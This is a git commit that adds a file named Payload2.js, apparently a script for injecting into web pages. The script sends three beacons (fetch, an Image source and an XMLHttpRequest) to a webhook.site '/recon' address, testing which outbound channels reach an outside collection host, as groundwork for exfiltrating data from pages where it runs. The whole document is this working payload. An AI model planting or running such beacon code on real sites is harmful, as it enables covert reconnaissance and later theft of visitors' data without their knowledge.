495407a093a0dd5f180de5b58e8aa7a61d977206
Ecar <86429683+Poggiecar@users.noreply.github.com>
2026-04-21 23:38:59 -0300

    Update and rename Payload2 to Payload2.js

---
+++ Payload2.js
@@ -0,0 +1,15 @@
+(function() {
+  // Test 1: fetch
+  fetch('https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon?test=fetch', {
+    method: 'GET',
+    mode: 'no-cors'
+  });
+
+  // Test 2: Image
+  new Image().src = 'https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon?test=img&t=' + Date.now();
+
+  // Test 3: XHR clásico
+  var x = new XMLHttpRequest();
+  x.open('GET', 'https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon?test=xhr', true);
+  x.send();
+})();
